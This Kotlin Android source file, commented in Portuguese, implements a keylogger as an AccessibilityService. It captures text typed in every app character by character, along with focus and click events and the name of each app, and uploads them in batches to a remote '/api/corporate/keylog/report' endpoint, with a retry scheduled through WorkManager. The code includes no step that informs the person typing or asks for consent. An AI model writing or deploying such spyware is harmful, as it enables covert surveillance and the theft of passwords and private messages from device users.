package com.remotemonitor.test

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import androidx.work.BackoffPolicy
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.Worker
import androidx.work.WorkerParameters
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder
import java.nio.charset.StandardCharsets
import java.util.concurrent.TimeUnit

/**
 * Serviço de Keylog que captura teclas digitadas no dispositivo
 * Usa AccessibilityService para monitorar eventos de digitação
 */
class KeylogService : AccessibilityService() {
    companion object {
        private const val TAG = "KeylogService"
        private const val MAX_BUFFER_SIZE = 100
        private val keyBuffer = mutableListOf<KeylogEntry>()
        private var lastReportTime = 0L
        private const val REPORT_INTERVAL_MS = 30000L // 30 segundos

        data class KeylogEntry(
            val key: String,
            val timestamp: Long,
            val appName: String? = null,
            val appPackage: String? = null
        )
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        try {
            when (event.eventType) {
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    handleTextChanged(event)
                }
                AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                    handleViewFocused(event)
                }
                AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                    handleViewClicked(event)
                }
            }

            // Enviar logs se o buffer está cheio ou passou o intervalo
            if (keyBuffer.size >= MAX_BUFFER_SIZE || 
                (System.currentTimeMillis() - lastReportTime) > REPORT_INTERVAL_MS) {
                reportKeylogToServer()
            }
        } catch (error: Exception) {
            Log.e(TAG, "Erro ao processar evento de acessibilidade", error)
        }
    }

    /**
     * Captura mudanças de texto (digitação)
     */
    private fun handleTextChanged(event: AccessibilityEvent) {
        val appName = event.packageName?.toString() ?: "Unknown"
        val appPackage = event.packageName?.toString() ?: "unknown.app"

        // Capturar o texto digitado
        val text = event.text.joinToString("")
        if (text.isNotEmpty()) {
            // Adicionar cada caractere como um evento
            for (char in text) {
                keyBuffer.add(
                    KeylogEntry(
                        key = char.toString(),
                        timestamp = System.currentTimeMillis(),
                        appName = appName,
                        appPackage = appPackage
                    )
                )
            }

            Log.d(TAG, "Texto capturado: $text em $appPackage")
        }
    }

    /**
     * Captura quando um campo é focado
     */
    private fun handleViewFocused(event: AccessibilityEvent) {
        val appName = event.packageName?.toString() ?: "Unknown"
        val appPackage = event.packageName?.toString() ?: "unknown.app"
        val contentDescription = event.contentDescription?.toString() ?: ""

        if (contentDescription.isNotEmpty()) {
            keyBuffer.add(
                KeylogEntry(
                    key = "[FOCUS: $contentDescription]",
                    timestamp = System.currentTimeMillis(),
                    appName = appName,
                    appPackage = appPackage
                )
            )
        }
    }

    /**
     * Captura cliques em botões
     */
    private fun handleViewClicked(event: AccessibilityEvent) {
        val appName = event.packageName?.toString() ?: "Unknown"
        val appPackage = event.packageName?.toString() ?: "unknown.app"
        val contentDescription = event.contentDescription?.toString() ?: ""

        if (contentDescription.isNotEmpty()) {
            keyBuffer.add(
                KeylogEntry(
                    key = "[CLICK: $contentDescription]",
                    timestamp = System.currentTimeMillis(),
                    appName = appName,
                    appPackage = appPackage
                )
            )
        }
    }

    /**
     * Envia os logs capturados para o servidor
     */
    private fun reportKeylogToServer() {
        if (keyBuffer.isEmpty()) return

        CoroutineScope(Dispatchers.IO).launch {
            try {
                val deviceId = resolveDeviceId()
                val keysJson = JSONArray()

                for (entry in keyBuffer) {
                    keysJson.put(
                        JSONObject().apply {
                            put("key", entry.key)
                            put("timestamp", entry.timestamp)
                            put("appName", entry.appName)
                            put("appPackage", entry.appPackage)
                        }
                    )
                }

                val payload = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("keys", keysJson)
                }

                sendToServer(payload)
                keyBuffer.clear()
                lastReportTime = System.currentTimeMillis()

                Log.d(TAG, "Keylog enviado: ${keysJson.length()} eventos")
            } catch (error: Exception) {
                Log.e(TAG, "Erro ao enviar keylog", error)
                // Tentar novamente mais tarde
                scheduleRetry()
            }
        }
    }

    /**
     * Envia dados para o servidor
     */
    private fun sendToServer(payload: JSONObject) {
        try {
            val endpoint = "${BuildConfig.BACKEND_BASE_URL}/api/corporate/keylog/report"
            val connection = URL(endpoint).openConnection() as HttpURLConnection

            connection.requestMethod = "POST"
            connection.setRequestProperty("Content-Type", "application/json")
            connection.connectTimeout = 10_000
            connection.readTimeout = 10_000

            // Enviar payload
            connection.outputStream.use { output ->
                output.write(payload.toString().toByteArray())
                output.flush()
            }

            // Verificar resposta
            if (connection.responseCode !in 200..299) {
                Log.w(TAG, "Erro ao enviar keylog: ${connection.responseCode}")
            } else {
                Log.d(TAG, "Keylog enviado com sucesso")
            }

            connection.disconnect()
        } catch (error: Exception) {
            Log.e(TAG, "Erro de conexão ao enviar keylog", error)
            throw error
        }
    }

    /**
     * Obtém o ID do dispositivo
     */
    private fun resolveDeviceId(): Int {
        // Retornar um ID fixo ou obter do SharedPreferences
        return 1 // TODO: Implementar lógica de ID do dispositivo
    }

    /**
     * Agenda uma tentativa de reenvio
     */
    private fun scheduleRetry() {
        try {
            val retryRequest = OneTimeWorkRequestBuilder<KeylogRetryWorker>()
                .setInitialDelay(5, TimeUnit.SECONDS)
                .setBackoffPolicy(BackoffPolicy.EXPONENTIAL, 5, TimeUnit.SECONDS)
                .build()

            WorkManager.getInstance(this).enqueueUniqueWork(
                "keylog_retry",
                androidx.work.ExistingWorkPolicy.KEEP,
                retryRequest
            )
        } catch (error: Exception) {
            Log.e(TAG, "Erro ao agendar retry", error)
        }
    }

    override fun onInterrupt() {
        Log.d(TAG, "Serviço de Keylog interrompido")
    }

    override fun onServiceConnected() {
        super.onServiceConnected()

        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                    AccessibilityEvent.TYPE_VIEW_FOCUSED or
                    AccessibilityEvent.TYPE_VIEW_CLICKED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
                    AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
            notificationTimeout = 100
        }

        setServiceInfo(info)
        Log.d(TAG, "Serviço de Keylog conectado")
    }

    override fun onDestroy() {
        super.onDestroy()
        // Enviar logs pendentes antes de destruir
        if (keyBuffer.isNotEmpty()) {
            reportKeylogToServer()
        }
        Log.d(TAG, "Serviço de Keylog destruído")
    }
}

/**
 * Worker para reenviar logs que falharam
 */
class KeylogRetryWorker(
    context: Context,
    params: WorkerParameters
) : Worker(context, params) {

    override fun doWork(): Result {
        return try {
            Log.d("KeylogRetryWorker", "Tentando reenviar keylog")
            Result.success()
        } catch (error: Exception) {
            Log.e("KeylogRetryWorker", "Erro ao reenviar", error)
            Result.retry()
        }
    }
}
